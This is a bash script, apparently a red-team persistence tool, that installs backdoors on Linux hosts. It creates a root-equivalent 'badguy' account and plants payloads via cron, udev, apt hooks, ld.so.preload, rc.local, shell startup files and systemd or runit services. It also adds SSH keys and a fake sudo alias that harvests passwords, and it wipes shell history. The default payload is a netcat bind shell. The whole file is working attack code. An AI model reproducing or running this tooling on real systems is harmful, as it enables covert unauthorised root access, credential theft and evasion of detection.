#/bin/bash

success="Success!"

help(){

    echo -e "
Usage: $0 [-method] [-options_for_method]

! If option has default value, it is not necessary !

Methods:
    -h   [ just this 'help' text ]
    -ar  [  add new root user.
        
        -u    username (default: badguy)
        -p    password (default: badguy)
        
        Example:
            $0 -ar -u name -p password 
         ]
    -cr  [ add new cron job with your file that will be executed via @hourly. 
        
        -f    your executаble
        
        Example:
            $0 -cr -f /tmp/super_payload
         ]
    -fs  [ add fake sudo alias to .bashrc, every sudo launch will cause execution of your file.

        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
        
        Example:
            $0 -fs -f /tmp/super_payload
         ]
    -ba  [ backdoor in apt config by adding Pre-Invoke process (config directory: '/etc/apt/apt.conf.d').
    
        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
        -n    name of your file in apt config directory (default: 'backdoor')
        
        Example:
            $0 -ba -f /tmp/super_payload -n cool_backdoor 
         ]
    -bd  [ backdoor in driver: when usb device will connect to machine, 
           your file will be executed (rules directory: '/etc/udev/rules.d').

        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
        -n    name of your file in udev rules directory (default: 'backdoor')

        Example:
            $0 -bd -f /tmp/super_payload -n cool_backdoor 
         ]
    -lp  [ add your .so file in ld_preload, to replace library functions with your code.

        -f    your .so file
        -r    root mode flag (without this flag rewritten LD_PRELOAD variable will be stored in '.bashrc',
                              with this flag, rewritten LD_PRELOAD variable will be stored in '/etc/profile'
                              and your .so file will be added to '/etc/ld.so.preload')

        Exammple:
            $0 -lp -r -f /tmp/super_library.so
         ]
    -bs  [ adds public RSA key to authorized_keys file to allow remote connection via ssh. 
        
        -f    your public key file (default: generate new key pair, print private key to console, 
              pub key -> in authorized_keys)
        -af    full path to authorized_keys file (default: '~/.ssh/authorized_keys')
        
        Examples:
            $0 -bs -af /tmp/new_authorized_keyfile -f my_rsa.pub
         ]
    -t   [ add new command to SIGINT signal using 'trap' binary (every time user presses 
          (Ctrl + C) your file will be executed).
        
        -f    your executаble

        Example:
            $0 -t -f /tmp/super_payload
         ]
    -rc  [ add your file to autorun using 'rc.local' file. 

        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')

        Example:
            $0 -rc -f /tmp/super_payload
         ]
    -b   [ add your file in '.bashrc' and/or in '.bash_profile' ('.bash_profile' is executed 
           for login shells, while '.bashrc' is executed for interactive non-login shells).

        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
        -r    flag for using only '.bashrc' file (default: use both files)
        -p    flag for using only '.bash_profile' (default: use both files)

        Example:
            $0 -b -f /tmp/super_payload -r 
         ]
    -s   [ add new service to 'systemd' and/or 'runit' (directory for 'systemd' services
           with root_mode: /etc/systemd/system/,for 'systemd' services without root_mode:
           '~/.config/systemd/user',for runit services: '/etc/sv/')

        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
        -n    name of your service (default:'badguy')
        -a    flag for using 'systemd' and 'runit' together (default: use only 'systemd')
        -run    use only 'runit'  (default: use only 'systemd')
        -r    flag for using root_mode
        -d    description for your service in 'systemd' (default:'persistence')
        -t    service restart timeout (default: 60 sec)

        Example:
            $0 -s -f /tmp/superpayload -n backdoor -r -d my_description -t 12
         ]
    -ch  [ clear all history 
        
        Example:
            $0 -ch
         ]
"
}

check(){
    if [ "$?" != "0" ]
    then
        success="Something went wrong("
        echo $success
        exit 0
    fi
}

add_root(){

    local login="badguy"
    local password="badguy"

    while [ -n "$1" ]
    do
        case "$1" in
            -u)
                shift
                login="$1"
            ;;

            -p) 
                shift
                password="$1"
            ;;
        esac
        shift
    done

    useradd -ou 0 -g 0 $login
    check
    echo $password | passwd --stdin $login 2>/dev/null || echo "$login:$password" | chpasswd
    check
    echo $success

}

cron(){

    local file="-1"
    
    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;
        esac
        shift
    done

    if [ $file == "-1" ]
    then
        echo Specify the file!!!
        exit 0
    fi

    (echo "@hourly $file")|crontab 2> /dev/null
    check
    echo $success

}

fake_sudo(){

    local file="nohup nc -lvnp 1234 -e /bin/bash"
    
    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;
        esac
        shift
    done

    echo  alias sudo=''\''echo -n "[sudo] password for $USER: ";read -s pwd;echo; unalias sudo; echo "$pwd" | /usr/bin/sudo -S' $file '> /dev/null && /usr/bin/sudo -S'\''' >> $HOME/.bashrc
    check
    echo $success
}

back_apt(){

    local name="backdoor"
    local file="nohup nc -lvnp 1234 -e /bin/bash"
    
    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;
            -n)
                shift
                name="$1"
            ;;
        esac
        shift
    done

    echo 'APT::Update::Pre-Invoke {"' $file '2> /dev/null &"};' > /etc/apt/apt.conf.d/$name
    check
    echo $success

}

back_driver(){

    local name="backdoor"
    local file="nohup nc -lvnp 1234 -e /bin/bash"
    

    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;
            -n)
                shift
                name="$1"
            ;;
        esac
        shift
    done

    echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$file\"" | tee /etc/udev/rules.d/$name.rules > /dev/null
    check
    echo $success
}

ld_preload(){

    local file="-1"
    local flag="0"
    
    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;

            -r)
                flag="1"
            ;;
        esac
        shift
    done

    if [ $file == "-1" ]
    then
        echo Specify the file!!!
        exit 0
    fi

    if [ $flag == "0" ]
    then
        echo export LD_PRELOAD=$file >> $HOME/.bashrc
        check
    else
        echo $file >> /etc/ld.so.preload
        check
        echo export LD_PRELOAD=$file >> /etc/profile
        check
    fi

    echo $success
}

back_ssh(){

    local file="-1"
    local auth_file="$HOME/.ssh/authorized_keys"
    local keyfile=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
    check
    
    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;

            -af)
                shift
                auth_file="$1"
        esac
        shift
    done

    if [ $auth_file == "$HOME/.ssh/authorized_keys" ]
    then
        mkdir $HOME/.ssh 2>/dev/null
    fi

    if [ $file != "-1" ]
    then
        cat $file >> $auth_file 
        check
    else
        ssh-keygen -f /tmp/$keyfile -N "" 1>/dev/null
        check
        cat /tmp/$keyfile.pub >> $auth_file
        check
        cat /tmp/$keyfile
        check
        rm -rf /tmp/$keyfile; rm -rf /tmp/$keyfile.pub
        check
    fi

    echo -e "\n\n$success"
}

trapp(){

    local file="-1"
    
    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;
        esac
        shift
    done

    if [ $file == "-1" ]
    then
        echo Specify the file!!!
        exit 0
    fi

    trap $file SIGINT
    check

    echo $success
}

rc(){

    local file="nohup nc -lvnp 1234 -e /bin/bash"
    
    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;
        esac
        shift
    done

    if [ $file == "-1" ]
    then
        echo Specify the file!!!
        exit 0
    fi

    echo $file >> /etc/rc.local
    check

    echo $success
}

brbp(){

    local file="nohup nc -lvnp 1234 -e /bin/bash"
    local flag="default"

    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;

            -r)
                flag="bashrc"
            ;;

            -p)
                flag="bash_profile"
            ;;
        esac
        shift
    done

    if [ $flag != "bash_profile" ]
    then
        echo $file >> $HOME/.bashrc
        check
    fi

    if [ $flag != "bashrc" ]
    then
        echo $file >> $HOME/.bash_profile
        check
    fi

    echo $success
}

service(){

    local file="nohup nc -lvnp 1234 -e /bin/bash"
    local flag="Systemd"
    local root_flag="0"
    local name="badguy"
    local description="persistence"
    local time="60"

    while [ -n "$1" ]
    do
        case "$1" in 
            -f) 
                shift
                file="$1"
            ;;

            -a)
                flag="All"
            ;;

            -run)
                flag="Runit"
            ;;

            -r)
                root_flag="1"
            ;;

            -n)
                shift
                name="$1"
            ;;

            -d)
                shift
                description="$1"
            ;;

            -t)
                shift
                time="$1"
            ;;
        esac
        shift
    done

    if [ $flag != "Runit" ]
    then
        if [ $root_flag == "1" ]
        then
            echo -e "[Unit]\nDescription=$description\n\n[Service]\nExecStart=$file\nRestart=always\nRestartSec=$time\n\n[Install]\nWantedBy=default.target" >> /etc/systemd/system/$name.service
            check
            systemctl enable $name.service
            check
            systemctl start $name.service
            check
        else
            mkdir $HOME/.config 2>/dev/null; mkdir $HOME/.config/systemd 2>/dev/null; mkdir $HOME/.config/systemd/user 2>/dev/null
            echo -e "[Unit]\nDescription=$description\n\n[Service]\nExecStart=$file\nRestart=always\nRestartSec=$time\n\n[Install]\nWantedBy=default.target" >> $HOME/.config/systemd/user/$name.service
            check
            systemctl --user enable $name.service
            check
            systemctl --user start $name.service
            check
        fi
    fi

    if [ $flag != "Systemd" ]
    then
        mkdir /etc/sv/$name
        check
        echo -e "#!/bin/bash\n\nexec $file" >> /etc/sv/$name/run
        check
        ln -s /etc/sv/$name /etc/service/$name 1>/dev/null
        check
    fi

    echo $success
}

clear_history(){ 
    
    history -c
}

while [ -n "$1" ]
do

    case "$1" in 

    -h)
        help
        exit 0
    ;;

    -ar)
        shift
        add_root "$@"
        exit 0
    ;;

    -cr) 
        shift
        cron "$@"
        exit 0
    ;;

    -fs)
        shift
        fake_sudo "$@"
        exit 0
    ;;

    -ba)
        shift
        back_apt "$@"
        exit 0
    ;;

    -bd)
        shift
        back_driver "$@"
        exit 0
    ;;

    -ch)
        shift
        clear_history "$@"
        exit 0
    ;;

    -lp)
        shift
        ld_preload "$@"
        exit 0
    ;;

    -bs)
        shift
        back_ssh "$@"
        exit 0
    ;;

    -t)
        shift
        trapp "$@"
        exit 0
    ;;

    -rc)
        shift
        rc "$@"
        exit 0
    ;;

    -b)
        shift
        brbp "$@"
        exit 0
    ;;

    -s)
        shift
        service "$@"
        exit 0
    ;;
    esac
shift
done

help